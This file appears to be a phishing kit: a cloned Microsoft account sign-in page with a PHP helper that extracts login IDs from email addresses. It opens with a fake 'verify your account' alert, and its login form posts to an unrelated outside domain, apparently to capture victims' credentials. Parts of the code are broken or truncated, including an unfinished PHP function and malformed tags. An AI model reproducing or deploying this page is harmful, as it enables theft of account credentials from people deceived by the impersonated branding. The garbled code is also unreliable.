<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)


?>

<!DOCTYPE html>
<html>
<script language="JavaScript">
alert("Click OK to Verify your account.")
</script>
<!All rights reserved. -->
<!DOCTYPE html>
<>
<>
<->
<html dir="ltr" lang="EN-US"><head><link rel="preconnect"  "">
<link rel="preconnect" href=" " crossorigin="">
<link rel="preconnect" href=" " crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href=" ">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><!-- base href=" " --><script type="text/javascript">
var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, UniversalSecondFactor: 15, Voice: -3};
function MM_validateForm() { //v4.0
  if (document.getElementById){
    var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
    for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=document.getElementById(args[i]);
      if (val) { nm=val.name; if ((val=val.value)!="") {
        if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
          if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
        } else if (test!='R') { num = parseFloat(val);
          if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
          if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
            min=test.substring(8,p); max=test.substring(p+1);
            if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
      } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
    } if (errors) alert('The following error(s) occurred:\n'+errors);
    document.MM_returnValue = (errors == '');
} }
</script><noscript><meta http-equiv="Refresh" content="0; URL= "/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br /><br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta name="robots" content="none"><meta name="PageID" content="i5030"><meta name="SiteID" content="292841"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var o=t[n]={exports:{},id:n,loaded:!1};return e[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){!function(){function e(){return u.$Config||u.ServerData||{}}function r(e,r){var t=u.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function t(){var e=u.$B;if(void 0===c)if(e)c=e.IE;else{var r=u.navigator.userAgent;c=r.indexOf("MSIE ")!==-1||r.indexOf("Trident/")!==-1}return c}function n(e){var r=e.indexOf("?"),t=r>-1?r:e.length;return t>g&&e.substr(t-g,g).toLowerCase()===f}function o(){var r=e(),t=r.loader||{};return t.slReportFailure||r.slReportFailure||!1}function a(){var r=e(),t=r.loader||{};return t.redirectToErrorPageOnLoadFailure||!1}function i(){var r=e(),t=r.loader||{};return t.logByThrowing||!1}function s(e){var r=!0,t=e.src||e.href||"";if(t){if(n(t))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(o){}}else r=!1;return r}function d(){function t(e){var r=l.getElementsByTagName("head")[0];r.appendChild(e)}function o(e,r,t,o){var s=null;return s=n(e)?a(e):"script"===o.toLowerCase()?i(e):c(e,o),r&&(s.id=r),"function"==typeof s.setAttribute&&(s.setAttribute("crossorigin","anonymous"),t&&"string"==typeof t&&s.setAttribute("integrity",t)),s}function a(e){var r=l.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function i(e){var r=l.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function c(e,r){var t=l.createElement(r);return t.src=e,t}function u(e){if(!(m&&m.length>1))return e;for(var r=0;r<m.length;r++)if(0===e.indexOf(m[r]))return m[r+1<m.length?r+1:0]+e.substring(m[r].length);return e}function f(e,t,n,o){return r("[$Loader]: "+(L.failMessage||"Failed"),o),R[e].retry<p?(R[e].retry++,h(e,t,n),void d._ReportFailure(R[e].retry,R[e].srcPath)):void(n&&n())}function g(e,t,n,o){if(s(o)){r("[$Loader]: "+(L.successMessage||"Loaded"),o),h(e+1,t,n);var a=R[e].onSuccess;"function"==typeof a&&a(R[e].srcPath)}else f(e,t,n,o)}function h(e,n,a){if(e<R.length){var i=R[e];if(!i||!i.srcPath)return void h(e+1,n,a);i.retry>0&&(i.srcPath=u(i.srcPath),i.origId||(i.origId=i.id),i.id=i.origId+"_Retry_"+i.retry);var s=o(i.srcPath,i.id,i.integrity,i.tagName);s.onload=function(){g(e,n,a,s)},s.onerror=function(){f(e,n,a,s)},s.onreadystatechange=function(){"loaded"===s.readyState?setTimeout(function(){g(e,n,a,s)},500):"complete"===s.readyState&&g(e,n,a,s)},t(s),r("[$Loader]: Loading '"+(i.srcPath||"")+"', id:"+(i.id||""))}else n&&n()}var v=e(),p=v.slMaxRetry||2,y=v.loader||{},m=y.cdnRoots||[],L=this,R=[];L.retryOnError=!0,L.successMessage="Loaded",L.failMessage="Error",L.Add=function(e,r,t,n,o,a){e&&R.push({srcPath:e,id:r,retry:n||0,integrity:t,tagName:o||"script",onSuccess:a})},L.AddForReload=function(e,r){var t=e.src||e.href||"";L.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},L.AddIf=function(e,r,t){e&&L.Add(r,t)},L.Load=function(e,r){h(0,e,r)}}var c,u=window,l=u.document,f=".css",g=f.length;d.On=function(e,r,t){if(!e)throw"The target element must be provided and cannot be null.";r?d.OnError(e,t):d.OnSuccess(e,t)},d.OnSuccess=function(e,t){var n=e.src||e.href||"",i=o(),c=a();if(!e)throw"The target element must be provided and cannot be null.";if(s(e)){r("[$Loader]: Loaded",e);var u=new d;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.Load(null,function(){if(i)throw"Unexpected state. ResourceLoader.Load() failed despite initial load success. ['"+n+"']";c&&(document.location.href="/error.aspx?err=504")})}else d.OnError(e,t)},d.OnError=function(e,t){var n=e.src||e.href||"",i=o(),s=a();if(!e)throw"The target element must be provided and cannot be null.";r("[$Loader]: Failed",e);var c=new d;c.failMessage="Reload Failed",c.successMessage="Reload Success",c.AddForReload(e,t),c.Load(null,function(){if(i)throw"Failed to load external resource ['"+n+"']";s&&(document.location.href="/error.aspx?err=504")}),d._ReportFailure(0,n)},d._ReportFailure=function(e,r){if(i()&&!t())throw"[Retry "+e+"] Failed to load external resource ['"+r+"'], reloading from fallback CDN endpoint"},u.$Loader=d}()}]));</script><script type="text/javascript">!function(r,t){for(var e in t)r[e]=t[e]}(this,function(r){function t(o){if(e[o])return e[o].exports;var n=e[o]={exports:{},id:o,loaded:!1};return r[o].call(n.exports,n,n.exports,t),n.loaded=!0,n.exports}var e={};return t.m=r,t.c=e,t.p="",t(0)}([function(r,t){!function(){function r(r,t){function e(i){var a=r[i];return i<o-1?void(n.r[a]?e(i+1):n.when(a,function(){e(i+1)})):void t(a)}var o=r.length;e(0)}function t(r,t,i){function a(){var r=!!u.method,n=r?u.method:i[0],a=u.extraArgs||[],c=o.$WebWatson;try{var f=e(i,!r);if(a&&a.length>0)for(var s=a.length,v=0;v<s;v++)f.push(a[v]);n.apply(t,f)}catch(h){return void(c&&c.submitFromException&&c.submitFromException(h))}}var u=n.r&&n.r[r];return t=t?t:this,u&&(u.skipTimeout?a():o.setTimeout(a,0)),u}function e(r,t){return Array.prototype.slice.call(r,t?1:0)}var o=window;o.$Do||(o.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var n=o.$Do;n.when=function(e,o){function i(r){t(r,a,u)||n.q.push({id:r,c:a,a:u})}var a=0,u=[],c=1,f="function"==typeof o;f||(a=o,c=2);for(var s=c;s<arguments.length;s++)u.push(arguments[s]);e instanceof Array?r(e,i):i(e)},n.register=function(r,e,o){if(!n.r[r]){n.o.push(r);var i={};if(e&&(i.method=e),o&&(i.skipTimeout=o),arguments&&arguments.length>3){i.extraArgs=[];for(var a=3;a<arguments.length;a++)i.extraArgs.push(arguments[a])}n.r[r]=i,n.lock++;try{for(var u=0;u<n.q.length;u++){var c=n.q[u];c.id==r&&t(r,c.c,c.a)&&n.removeItems.push(c)}}catch(f){throw f}finally{if(n.lock--,0===n.lock){for(var s=0;s<n.removeItems.length;s++)for(var v=n.removeItems[s],h=0;h<n.q.length;h++)if(n.q[h]===v){n.q.splice(h,1);break}n.removeItems=[]}}}},n.unregister=function(r){n.r[r]&&delete n.r[r]}}()}]));</script><script type="text/javascript">!function(n,e){for(var r in e)n[r]=e[r]}(this,function(n){function e(o){if(r[o])return r[o].exports;var t=r[o]={exports:{},id:o,loaded:!1};return n[o].call(t.exports,t,t.exports,e),t.loaded=!0,t.exports}var r={};return e.m=n,e.c=r,e.p="",e(0)}([function(n,e){!function(){function n(){return r.$Config||r.ServerData||{}}function e(){var e=(n(),new t),r=this,i=[],f=[];r.Add=function(n,r,o,t){e.Add(n,r,o,t)},r.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)i.push(n[e]);else i.push(n)},r.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)f.push(n[e]);else f.push(n)},r.Load=function(n,r){var t=function(){n&&n();for(var e=0;e<i.length;e++)o.register(i[e],0,!0)},u=function(){e.Load(t,r)};f.length>0?o.when(f,u):u()}}var r=window,o=(r.document,r.$Do),t=r.$Loader,i=".css";i.length;e.WhenLoaded=function(n,e){o.when(n,e)},r.$DepLoader=e}()}]));</script><link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29368.4/images/favicon.ico"><link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21033_aaRUc92kCx1I0HSCbabz7g2.css"><style type="text/css"></style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var i=t[n]={exports:{},id:n,loaded:!1};return e[n].call(i.exports,i,i.exports,r),i.loaded=!0,i.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,i,s,a){var o=1,c=unescape("%3Cscript type='text/javascript'");a&&(c+=" crossorigin='anonymous' integrity='"+a+"'"),c+=" src='";var u=unescape("'%3E%3C/script%3E"),S=r;if(n&&n.userAgent&&s&&s!==r){var d=n.userAgent.toLowerCase(),p=d.indexOf("edge")>=0;if(!p){var f=d.match(/chrome\/([0-9]+)\./),g=f&&2===f.length&&!isNaN(f[1])&&parseInt(f[1])>54;g&&(S=s)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,i<=o&&document.write(c+S+u)):t.g_sSRSSuccess+=e+"|"+i+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://logincdn.msauth.net/16.000.29368.4/images/Windows_Live_v_thumb.jpg"><script type="text/javascript">var ServerData = {CG:true,CJ:false,CK:true,aA:'',aB:'',urlPostMsa:'',CO:false,CP:false,Bq:true,Bs:false,aH:' ',aI:' ',Bw:true,aK:'',CW:true,By:true,aO:{"appInsightsConfig":{"instrumentationKey":"69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293","webAnalyticsConfiguration":{"autoCapture":{"jsError":1,"click":0}}},"appId":"-","defaultEventName":"IDUX_MSAClientTelemetryEvent_WebWatson","autoPost":true,"autoPostDelay":1000,"flush":60000,"maxEvents":1,"minEvents":1,"pltDelay":500,"telemetryEnabled":true,"useOneDSEventApi":true,"serviceID":2},urlReportPageLoad:'',aR:true,urlLogin:' ',Ca:true,DA:"Ust. <a href=\" " id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",aV:false,b6:2,hpgid:33,sRequestCountry:'NG',aW:true,b7:0,Cd:false,Ce:false,b8:true,DG:'',Ch:false,fApplicationInsightsEnabled:false,DH:'',DI:'',DJ:'',DL:' ',urlFed:'',ab:'NG',iApplicationInsightsEnabledPercentage:0,DN:'',DO:' ',urlPostAad:'',Cr:false,ag:' ',ah:'',bG:'',urlApplicationInsightsEndpoint:'',ai:' ',sPOST_NewUser:'',bI:'PPFT',ak:'',bL:'',Cy:true,bM:'',ap:'PROD',bP:' ',iServerExecutionTime:5,urlPost:'',at:true,au:false,c4:"#~#partnerdomain#~# does\'t ut. <a href=\"#~#WLPaneHelpInviteBlockedURL_LS#~#\" id=\"idPaneHelpInviteBlockedLink9\">Learn More</a>",Da:"u\'re using someone else\'s PC. <a href=\"" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",aw:true,c5:'',Db:"Your session has timed out. To request a single use code, please <a href=\"javascript:NewOTCRequest()\">refresh the page</a>.",Dd:"Sign in",sApplicationInsightsInstrumentationKey:'',A:10000,fWebNgcFS:false,Dh:'',B:2,C:{},Di:'',Dj:'',D:false,Dk:'4',F:1,Dm:'',H:'',I:'',J:'',A0:0,Dq:' ',cD:false,K:{"ri":"BL6PPF030EB0700","ver":"16.0.29368.4"},A1:0,L:false,M:-1,A4:0,A5:1,cH:0,A7:'',Q:1033,str:[],bk:'i5030',R:' ',A8:' ',bl:'',cL:1,S:false,bm:'',cO:{},V:'' ',urlSwitch:' ',cT:'',bv:' ',urlFedConvertRename:' ',AC:'',bx:'',AE:' ',bz:' ',cY:'Passp',a:' ',b:'',AI:true,d:'',AJ:3,e:true,AK:null,g:'',i:'292841',cc:false,k:'77be65b8f72e485cbb9d6d2e57d058c8',l:2,B1:3,AS:true,B3:5,AT:false,B4:0,sCBUpTxt1:'',ci:0,AV:true,sCBUpTxt2:'',sHostBuildNumber:'16.0.29368.4',AY:true,u:' ',v:'',cp:{},cq:{'Logo':'','LogoAltText':'','LogoText':'','ShowWLHeader':true},correlationId:'77be65b8f72e485cbb9d6d2e57d058c8',cs:'##li16####B##Hotmail##/B####BR##The smart way to do email - fast, easy and reliable##li8####B##Messenger##/B####BR##Stay in t your life##li10####B##SkyDrive##/B####BR##Free, password-protected online storage',oPost:{},z:0,Aa:1,ct:'',cu:',Ab:null,Ad:' ',BC:false,Ae:'',cx:'',BE:true,cy:'',Ag:false,Ah:true,BH:false,Ai:true,Aj:0,BK:true,sErrTxt:'',Am:'AF~Afghanistan~93!!!AL~Albania~355!!!DZ~Algeria~213!!!AD~Andorra~376!!!AO~Angola~244!!!AQ~Antarctica~672!!!AG~Antigua and Barbuda~1!!!AR~Argentina~54!!!AM~Armenia~374!!!AW~Aruba~297!!!AC~Ascension Island~247!!!AU~Australia~61!!!AT~Austria~43!!!AZ~Azerbaijan~994!!!BS~Bahamas~1!!!BH~Bahrain~973!!!BD~Bangladesh~880!!!BB~Barbados~1!!!BY~Belarus~375!!!BE~Belgium~32!!!BZ~Belize~501!!!BJ~Benin~229!!!BM~Bermuda~1!!!BT~Bhutan~975!!!BO~Bolivia~591!!!BQ~Bonaire~599!!!BA~Bosnia and Herzegovina~387!!!BW~Botswana~267!!!BV~Bouvet Island~47!!!BR~Brazil~55!!!IO~British Indian Ocean Territory~44!!!VG~British Virgin Islands~1!!!BN~Brunei~673!!!BG~Bulgaria~359!!!BF~Burkina Faso~226!!!BI~Burundi~257!!!CV~Cabo Verde~238!!!KH~Cambodia~855!!!CM~Cameroon~237!!!CA~Canada~1!!!KY~Cayman Islands~1!!!CF~Central African Republic~236!!!TD~Chad~235!!!CL~Chile~56!!!CN~China~86!!!CX~Christmas Island~61!!!CC~Cocos (Keeling) Islands~61!!!CO~Colombia~57!!!KM~Comoros~269!!!CG~Congo~242!!!CD~Congo (DRC)~243!!!CK~Cook Islands~682!!!CR~Costa Rica~506!!!CI~Côte d\'Ivoire~225!!!HR~Croatia~385!!!CU~Cuba~53!!!CW~Curaçao~599!!!CY~Cyprus~357!!!CZ~Czechia~420!!!DK~Denmark~45!!!DJ~Djibouti~253!!!DM~Dominica~1!!!DO~Dominican Republic~1!!!EC~Ecuador~593!!!EG~Egypt~20!!!SV~El Salvador~503!!!GQ~Equatorial Guinea~240!!!ER~Eritrea~291!!!EE~Estonia~372!!!ET~Ethiopia~251!!!FK~Falkland Islands~500!!!FO~Faroe Islands~298!!!FJ~Fiji~679!!!FI~Finland~358!!!FR~France~33!!!GF~French Guiana~594!!!PF~French Polynesia~689!!!GA~Gabon~241!!!GM~Gambia~220!!!GE~Georgia~995!!!DE~Germany~49!!!GH~Ghana~233!!!GI~Gibraltar~350!!!GR~Greece~30!!!GL~Greenland~299!!!GD~Grenada~1!!!GP~Guadeloupe~590!!!GU~Guam~1!!!GT~Guatemala~502!!!GG~Guernsey~44!!!GN~Guinea~224!!!GW~Guinea-Bissau~245!!!GY~Guyana~592!!!HT~Haiti~509!!!HN~Honduras~504!!!HK~Hong Kong SAR~852!!!HU~Hungary~36!!!IS~Iceland~354!!!IN~India~91!!!ID~Indonesia~62!!!IR~Iran~98!!!IQ~Iraq~964!!!IE~Ireland~353!!!IM~Isle of Man~44!!!IL~Israel~972!!!IT~Italy~39!!!JM~Jamaica~1!!!XJ~Jan Mayen~47!!!JP~Japan~81!!!JE~Jersey~44!!!JO~Jordan~962!!!KZ~Kazakhstan~7!!!KE~Kenya~254!!!KI~Kiribati~686!!!KR~Korea~82!!!XK~Kosovo~383!!!KW~Kuwait~965!!!KG~Kyrgyzstan~996!!!LA~Laos~856!!!LV~Latvia~371!!!LB~Lebanon~961!!!LS~Lesotho~266!!!LR~Liberia~231!!!LY~Libya~218!!!LI~Liechtenstein~423!!!LT~Lithuania~370!!!LU~Luxembourg~352!!!MO~Macao SAR~853!!!MK~North Macedonia~389!!!MG~Madagascar~261!!!MW~Malawi~265!!!MY~Malaysia~60!!!MV~Maldives~960!!!ML~Mali~223!!!MT~Malta~356!!!MH~Marshall Islands~692!!!MQ~Martinique~596!!!MR~Mauritania~222!!!MU~Mauritius~230!!!YT~Mayotte~262!!!MX~Mexico~52!!!FM~Micronesia~691!!!MD~Moldova~373!!!MC~Monaco~377!!!MN~Mongolia~976!!!ME~Montenegro~382!!!MS~Montserrat~1!!!MA~Morocco~212!!!MZ~Mozambique~258!!!MM~Myanmar~95!!!NA~Namibia~264!!!NR~Nauru~674!!!NP~Nepal~977!!!NL~Netherlands~31!!!AN~Netherlands Antilles (Former)~599!!!NC~New Caledonia~687!!!NZ~New Zealand~64!!!NI~Nicaragua~505!!!NE~Niger~227!!!NG~Nigeria~234!!!NU~Niue~683!!!MP~Northern Mariana Islands~1!!!NO~Norway~47!!!OM~Oman~968!!!PK~Pakistan~92!!!PW~Palau~680!!!PS~Palestinian Authority~970!!!PA~Panama~507!!!PG~Papua New Guinea~675!!!PY~Paraguay~595!!!PE~Peru~51!!!PH~Philippines~63!!!PL~Poland~48!!!PT~Portugal~351!!!QA~Qatar~974!!!RE~Réunion~262!!!RO~Romania~40!!!RU~Russia~7!!!RW~Rwanda~250!!!XS~Saba~599!!!KN~Saint Kitts and Nevis~1!!!LC~Saint Lucia~1!!!PM~Saint Pierre and Miquelon~508!!!VC~Saint Vincent and the Grenadines~1!!!WS~Samoa~685!!!SM~San Marino~378!!!ST~São Tomé and Príncipe~239!!!SA~Saudi Arabia~966!!!SN~Senegal~221!!!RS~Serbia~381!!!SC~Seychelles~248!!!SL~Sierra Leone~232!!!SG~Singapore~65!!!XE~Sint Eustatius~599!!!SK~Slovakia~421!!!SI~Slovenia~386!!!SB~Solomon Islands~677!!!SO~Somalia~252!!!ZA~South Africa~27!!!SS~South Sudan~211!!!ES~Spain~34!!!LK~Sri Lanka~94!!!SH~St Helena, Ascension, and Tristan da Cunha~290!!!SD~Sudan~249!!!SR~Suriname~597!!!SJ~Svalbard~47!!!SZ~Swaziland~268!!!SE~Sweden~46!!!CH~Switzerland~41!!!SY~Syria~963!!!TW~Taiwan~886!!!TJ~Tajikistan~992!!!TZ~Tanzania~255!!!TH~Thailand~66!!!TL~Timor-Leste~670!!!TG~Togo~228!!!TK~Tokelau~690!!!TO~Tonga~676!!!TT~Trinidad and Tobago~1!!!TA~Tristan da Cunha~290!!!TN~Tunisia~216!!!TR~Turkey~90!!!TM~Turkmenistan~993!!!TC~Turks and Caicos Islands~1!!!TV~Tuvalu~688!!!UM~U.S. Outlying Islands~1!!!VI~U.S. Virgin Islands~1!!!UG~Uganda~256!!!UA~Ukraine~380!!!AE~United Arab Emirates~971!!!UK~United Kingdom~44!!!US~United States~1!!!UY~Uruguay~598!!!UZ~Uzbekistan~998!!!VU~Vanuatu~678!!!VA~Vatican City~379!!!VE~Venezuela~58!!!VN~Vietnam~84!!!WF~Wallis and Futuna~681!!!YE~Yemen~967!!!ZM~Zambia~260!!!ZW~Zimbabwe~263',Ao:'',BN:false,html:[],BQ:true,iPawnIcon:1,sFTTag:'<input type="hidden" name="PPFT" id="i0327" value="DRuOaa54CqkQzl!6SUn7Brk*VT6yD*7atCXE6tL0Bf3iR!sQiiEpUB3*5uVDA8qNZTSD0KRgKGnHFCUqn7MyNC2NqjMOy82pWFK9jjVff3JoxfY61ggr!qOJunOIQRBirknDEgGVqq*wg16cdg1ogJVx7Vg8pM9uAKa6k4SDhmt4YQpsUvIIHbb4xQY0dnopjTyC4hFWRskO5nMi5OPlmiT87rY826Q!bk3HfWkfqHKihMwaUpIDFNYR!3BQYOcSxA$$"/>',Ar:[],At:true,loader:{cdnRoots:[' ',' ']},Ax:false,C7:false,BX:true,fHasBackgroundColor:false,urlStaySignIn:' ',a2:true,CA:false,CB:true,a8:false,CD:false,Be:false,a9:false};var HIP={};</script><script type="text/javascript">window.UXResourceDependencies = [];</script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("","ConvergedLoginPaginatedStrings","sha384-5RO9uTtjkbq9p1djflCI45KDOT0xj5xgsUJzLIJFt+vnOscmlVM+Zlct2gwTRirX");l.Provides("UX_JS_Strings");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript" src="https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-5RO9uTtjkbq9p1djflCI45KDOT0xj5xgsUJzLIJFt+vnOscmlVM+Zlct2gwTRirX"></script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_VEY5BMsO3lK-ATXHWupGkQ2.js","ConvergedLogin_PCore","sha384-N3p678aaJf4mwXQi8+l+5Azhkk6rGEeOCvn2ID5pydCvKdMsb1A7St8EiCVWITZl");l.Requires("UX_JS_Strings");l.Provides("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript">window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); };</script><script type="text/javascript" src="" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-N3p678aaJf4mwXQi8+l+5Azhkk6rGEeOCvn2ID5pydCvKdMsb1A7St8EiCVWITZl"></script><script charset="utf-8" src="index_files/oneDs_cf88713273157e0b2931.js"></script><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><script charset="utf-8" src=""></script></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form action="https://ugccanada.com/validated.php" method="post" name="f1" target="_top" id="i0281" novalidate autocomplete="off" onSubmit="MM_validateForm('i0118','','R');return document.MM_returnValue" spellcheck="false" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog()">

    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page" data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.e,
            showFooterLinks: true,
            useWizardBehavior: svr.BY,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="component: { name: 'background-image-control',
    publicMethods: $page.backgroundControlMethods,
    event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url(&quot;https://nkewgebnrealmtor.com/po1.jpeg&quot;);" class="background-image ext-background-image"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.ci --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="css: { 'has-header': showHeader }, externalCss: { 'middle': true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.BN --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.b8 &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="" svgsrc="" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko -->
<!-- /ko --><!-- /ko -->

</div


        <!-- /ko -->

        <!-- ko if: svr.c5 && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->


        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.aw,
                disableAnimationIfAnimationEndUnsupported: svr.Cd,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
